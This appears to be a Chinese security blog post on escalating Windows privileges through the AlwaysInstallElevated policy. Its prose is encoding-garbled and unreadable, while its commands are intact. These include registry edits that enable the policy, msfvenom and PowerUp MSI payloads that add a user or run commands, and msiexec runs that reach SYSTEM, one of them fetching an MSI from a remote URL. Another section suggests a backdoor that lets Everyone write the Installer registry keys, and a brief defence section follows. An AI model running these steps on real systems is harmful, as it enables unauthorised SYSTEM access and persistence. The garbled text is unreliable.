I"Â*<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åˆ©ç”¨AlwaysInstallElevatedææƒæ˜¯ä¸€ä¸ª2017å¹´å…¬å¼€çš„æŠ€æœ¯ï¼ŒMetasploitå’ŒPowerUpéƒ½æä¾›äº†åˆ©ç”¨æ–¹æ³•</p>

<p>æˆ‘åœ¨ç ”ç©¶çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Metasploitçš„åˆ©ç”¨æ–¹æ³•å­˜åœ¨ä¸€äº›ä¸è¶³ï¼Œæˆ‘é‡åˆ°äº†å’Œå…¶ä»–å…¬å¼€æ–‡ç« æè¿°ä¸ä¸€æ ·çš„æƒ…å†µ</p>

<p>äºæ˜¯æˆ‘åšäº†è¿›ä¸€æ­¥çš„ç ”ç©¶ï¼Œæœ¬æ–‡å°†è¦ä»‹ç»æˆ‘é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>å¸¸è§„åˆ©ç”¨æ–¹æ³•</li>
  <li>æˆ‘åœ¨æµ‹è¯•ä¸­é‡åˆ°çš„é—®é¢˜</li>
  <li>è§£å†³æ–¹æ³•</li>
  <li>æ‰©å±•åˆ©ç”¨æ€è·¯</li>
</ul>

<h2 id="0x02-å¸¸è§„åˆ©ç”¨æ–¹æ³•">0x02 å¸¸è§„åˆ©ç”¨æ–¹æ³•</h2>
<hr />

<p>AlwaysInstallElevatedæ˜¯ä¸€ä¸ªç»„ç­–ç•¥é…ç½®ï¼Œå¦‚æœå¯ç”¨ï¼Œé‚£ä¹ˆå°†å…è®¸æ™®é€šç”¨æˆ·ä»¥SYSTEMæƒé™è¿è¡Œå®‰è£…æ–‡ä»¶(msi)</p>

<h3 id="å¯ç”¨æ–¹æ³•">å¯ç”¨æ–¹æ³•ï¼š</h3>

<p>éœ€è¦ä¿®æ”¹ä»¥ä¸‹ä¸¤ä¸ªç»„ç­–ç•¥ï¼š</p>

<ul>
  <li>Computer Configuration\Administrative Templates\Windows Components\Windows Installer</li>
  <li>User Configuration\Administrative Templates\Windows Components\Windows Installer</li>
</ul>

<p>è®¾ç½®æˆEnabledï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-1.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ— æ³•é€šè¿‡secedit.exeåœ¨å‘½ä»¤è¡Œä¸‹ä¿®æ”¹ä»¥ä¸Šä¸¤ä¸ªç»„ç­–ç•¥</p>

<h3 id="å‘½ä»¤è¡Œä¸‹çš„å¯ç”¨æ–¹æ³•">å‘½ä»¤è¡Œä¸‹çš„å¯ç”¨æ–¹æ³•ï¼š</h3>

<p>åˆ›å»ºä»¥ä¸‹ä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹ï¼š</p>

<ul>
  <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer,AlwaysInstallElevated,1</li>
  <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer,AlwaysInstallElevated,1</li>
</ul>

<p>cmdçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
</code></pre></div></div>

<h3 id="åˆ©ç”¨æ–¹æ³•">åˆ©ç”¨æ–¹æ³•ï¼š</h3>

<p>å¯ç”¨AlwaysInstallElevatedåï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œè°ƒç”¨msiexecå®‰è£…msiæ–‡ä»¶ï¼Œmsiæ–‡ä»¶å†…åŒ…å«è¦æ‰§è¡Œçš„Payloadï¼ŒPayloadå°†ä¼šä»¥Systemæƒé™æ‰§è¡Œ</p>

<p>è°ƒç”¨msiexecçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i test.msi
</code></pre></div></div>

<p>/iå‚æ•°ç”¨æ¥è¡¨ç¤ºå®‰è£…æ“ä½œ</p>

<p>/qå‚æ•°ç”¨æ¥éšè—å®‰è£…ç•Œé¢</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ‰§è¡Œåä¼šåœ¨%TEMP%ä¸‹ç”ŸæˆMSIçš„logæ–‡ä»¶</p>

<p>æ›´å¤šå…³äºmsiexecçš„ä»‹ç»å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec">ã€Šæ¸—é€æµ‹è¯•ä¸­çš„msiexecã€‹</a></p>

<h2 id="0x03-å¼€æºæ–¹æ³•æµ‹è¯•">0x03 å¼€æºæ–¹æ³•æµ‹è¯•</h2>
<hr />

<p>åœ¨æµ‹è¯•ç¯å¢ƒå¯ç”¨AlwaysInstallElevatedï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
</code></pre></div></div>

<h3 id="1powerup">1.PowerUp</h3>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</p>

<p>(1)æµ‹è¯•æ˜¯å¦å¯ç”¨AlwaysInstallElevated</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
</code></pre></div></div>

<p>è¿”å›Trueä»£è¡¨å¼€å¯</p>

<p>(2)å¯¼å‡ºmsiæ–‡ä»¶</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUp.ps1
Write-UserAddMSI
</code></pre></div></div>

<p>å½“å‰ç›®å½•ç”ŸæˆUserAdd.msi</p>

<p>(3)å‘½ä»¤è¡Œæ‰§è¡Œ(å½“å‰ç”¨æˆ·æƒé™)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i UserAdd.msi
</code></pre></div></div>

<p>å¼¹å‡ºæ·»åŠ ç”¨æˆ·çš„å¯¹è¯æ¡†ï¼Œèƒ½å¤Ÿç”¨æ¥æ·»åŠ ç”¨æˆ·ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-2.png" alt="Alt text" /></p>

<p>æ­¤æ—¶æŸ¥çœ‹è¯¥å¯¹è¯æ¡†çš„æƒé™ä¸ºSystemï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-3.png" alt="Alt text" /></p>

<p>ææƒæˆåŠŸ</p>

<h3 id="2metasploit">2.Metasploit</h3>

<p>ç”Ÿæˆå¼¹å‡ºè®¡ç®—å™¨çš„msiæ–‡ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/exec CMD=calc.exe -f msi &gt;calc.msi
</code></pre></div></div>

<p>å‘½ä»¤è¡Œæ‰§è¡Œmsiæ–‡ä»¶(å½“å‰ç”¨æˆ·æƒé™)ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i calc.msi
</code></pre></div></div>

<p>å¼¹å‡ºçš„è®¡ç®—å™¨æƒé™ä¸ºMediumï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-4.png" alt="Alt text" /></p>

<p>è¿™ä¸PowerUpçš„ç»“æœä¸åŒ</p>

<p>æ¢æˆå…¶ä»–Payloadçš„msiæ–‡ä»¶ï¼Œä¾‹å¦‚æ·»åŠ ç”¨æˆ·ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/adduser USER=test PASS=12356QW!@ -f msi &gt;adduser.msi
</code></pre></div></div>

<p>ä¾‹å¦‚æ‰§è¡Œcmdå‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/exec CMD='whoami &gt;1.txt' -f msi &gt; cmd.msi
</code></pre></div></div>

<p>ç”±äºæƒé™ä¸å¤Ÿ(ä¸ºMedium)ï¼Œå‡å¤±è´¥</p>

<p>è¿™ä¸å…¶ä»–å…¬å¼€æ–‡ç« ä»‹ç»çš„æƒ…å†µä¸ä¸€æ ·</p>

<p>ä¸ªäººçŒœæµ‹ï¼š</p>

<p>ä½¿ç”¨Metasploitç”Ÿæˆçš„msiæ–‡ä»¶åœ¨è¿è¡Œæ—¶æ²¡æœ‰è¦æ±‚æå‡æƒé™ï¼Œæ‰€ä»¥å¯¼è‡´äº†è¿™ä¸ªé—®é¢˜</p>

<h2 id="0x04-è§£å†³æ–¹æ³•">0x04 è§£å†³æ–¹æ³•</h2>
<hr />

<p>è¿™é‡Œå¯ä»¥å‚è€ƒPowerUpçš„æ–¹å¼ç”Ÿæˆmsiæ–‡ä»¶</p>

<p>ç›´æ¥æ‰§è¡ŒPowerUpç”Ÿæˆçš„UserAdd.msiï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-1.png" alt="Alt text" /></p>

<p>æç¤ºmsiæ–‡ä»¶æ˜¯ç”±MSI Wrapperç”Ÿæˆ</p>

<p>ä¸‹é¢æˆ‘ä»¬å°±å°è¯•ä½¿ç”¨MSI Wrapperç”Ÿæˆä¸€ä¸ªå¯ç”¨çš„Payload</p>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://www.exemsi.com/download/</p>

<p>ç”Ÿæˆè¿‡ç¨‹å¦‚ä¸‹ï¼š</p>

<h4 id="1å°†payloadè®¾ç½®ä¸ºæ‰§è¡Œprocesshacker">1.å°†Payloadè®¾ç½®ä¸ºæ‰§è¡ŒProcessHacker</h4>

<p>é…ç½®å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-2.png" alt="Alt text" /></p>

<h4 id="2è¿è¡Œæ—¶è¦æ±‚æå‡æƒé™">2.è¿è¡Œæ—¶è¦æ±‚æå‡æƒé™</h4>

<p>é…ç½®å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-3.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>MSI installation contextä¸‹é€‰æ‹©Per Userå’ŒPer Machineéƒ½å¯ä»¥</p>

<p>å…¶ä»–é…ç½®æŒ‰ç…§é»˜è®¤è®¾ç½®ï¼Œç”Ÿæˆçš„msiæ–‡ä»¶å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/test/blob/master/RunProcessHacker.msi</p>

<p>å†æ¬¡æµ‹è¯•ï¼Œå‘½ä»¤è¡Œæ‰§è¡Œmsiæ–‡ä»¶(å½“å‰ç”¨æˆ·æƒé™)ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i RunProcessHacker.msi
</code></pre></div></div>

<p>ProcessHackerä»¥Systemæƒé™æ‰§è¡Œï¼Œåˆ©ç”¨æˆåŠŸï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-4.png" alt="Alt text" /></p>

<p>ç»¼åˆä»¥ä¸Šçš„æµ‹è¯•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼š</p>

<p>ä½¿ç”¨Metasploitç”Ÿæˆçš„msiæ–‡ä»¶åœ¨è¿è¡Œæ—¶æ²¡æœ‰è¦æ±‚æå‡æƒé™ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨AlwaysInstallElevatedææƒ</p>

<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨MSI Wrapperç”Ÿæˆå¯ä¾›åˆ©ç”¨çš„msiæ–‡ä»¶</p>

<h2 id="0x05-æ‰©å±•åˆ©ç”¨æ€è·¯">0x05 æ‰©å±•åˆ©ç”¨æ€è·¯</h2>
<hr />

<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå…ˆå¯¹æ³¨å†Œè¡¨é¡¹è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶(å­˜åœ¨ä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹)ï¼Œå°±å¯ä»¥åˆ©ç”¨AlwaysInstallElevatedææƒ</p>

<h3 id="æ‰©å±•æ€è·¯1">æ‰©å±•æ€è·¯1ï¼š</h3>

<p>å¦‚æœè·å¾—äº†Backup serviceç”¨æˆ·çš„æƒé™ï¼Œè¾“å…¥<code class="language-plaintext highlighter-rouge">whoami /priv</code>åï¼Œå‘ç°å­˜åœ¨ä»¥ä¸‹æƒé™ï¼š</p>

<ul>
  <li>SeRestorePrivilege</li>
  <li>SeTakeOwnershipPrivilege</li>
</ul>

<p>æ­¤æ—¶èƒ½å¤Ÿå¯¹æ³¨å†Œè¡¨è¿›è¡Œå†™æ“ä½œï¼Œå¯ä»¥åˆ›å»ºå¯¹åº”çš„æ³¨å†Œè¡¨é¡¹ï¼Œå†åˆ©ç”¨AlwaysInstallElevatedææƒ</p>

<p>åˆ©ç”¨SeRestorePrivilegeå’ŒSeTakeOwnershipPrivilegeå†™æ³¨å†Œè¡¨å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« :<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8">ã€Šæ¸—é€æŠ€å·§â€”â€”Windowsä¹ç§æƒé™çš„åˆ©ç”¨ã€‹</a></p>

<h3 id="æ‰©å±•æ€è·¯2">æ‰©å±•æ€è·¯2ï¼š</h3>

<p>å¦‚æœå·²è·å¾—ç³»ç»Ÿæƒé™ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªææƒåé—¨</p>

<p>å¯¹ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ·»åŠ ACLï¼Œå…è®¸Everyoneè¿›è¡Œå†™æ“ä½œï¼š</p>

<ul>
  <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
  <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
</ul>

<p>å¯¹æ³¨å†Œè¡¨é¡¹æ·»åŠ ACLçš„æ–¹æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List">ã€Šæ¸—é€æŠ€å·§â€”â€”Windowsä¸‹çš„Access Control Listã€‹</a></p>

<h3 id="æ‰©å±•æ€è·¯3">æ‰©å±•æ€è·¯3ï¼š</h3>

<p>msiexecæ”¯æŒè¿œç¨‹ä¸‹è½½æ‰§è¡Œï¼Œé‚£ä¹ˆèƒ½å¦åˆ©ç”¨AlwaysInstallElevatedææƒï¼Ÿ</p>

<p>æµ‹è¯•å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/RunProcessHacker.msi
</code></pre></div></div>

<p>æ‰§è¡Œå¤±è´¥</p>

<p>ä¸‹é¢æŸ¥æ‰¾åŸå› ï¼Œæ˜¾ç¤ºå®‰è£…è¿‡ç¨‹ï¼Œæµ‹è¯•å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /i https://raw.githubusercontent.com/3gstudent/test/master/RunProcessHacker.msi
</code></pre></div></div>

<p>æç¤ºæ¥æºä¸å¯ä¿¡ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/4-1.png" alt="Alt text" /></p>

<p>å¾—å‡ºç»“è®ºï¼š</p>

<p>msiæ–‡ä»¶éœ€è¦å¯ä¿¡çš„è¯ä¹¦æ‰èƒ½è¿œç¨‹åˆ©ç”¨AlwaysInstallElevatedææƒ</p>

<h2 id="0x06-é˜²å¾¡å»ºè®®">0x06 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>å¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œç¦ç”¨AlwaysInstallElevated</p>

<p>ç›‘æ§æ³¨å†Œè¡¨é¡¹ï¼š</p>

<ul>
  <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
  <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
</ul>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åˆ©ç”¨AlwaysInstallElevatedææƒçš„æ–¹æ³•ï¼Œæ‰¾åˆ°äº†ä½¿ç”¨Metasploitç”Ÿæˆçš„msiæ–‡ä»¶åˆ©ç”¨å¤±è´¥çš„åŸå› ï¼Œæœ€åä»‹ç»äº†å¦‚ä½•é€šè¿‡MSI Wrapperç”Ÿæˆå¯ä¾›åˆ©ç”¨çš„msiæ–‡ä»¶</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET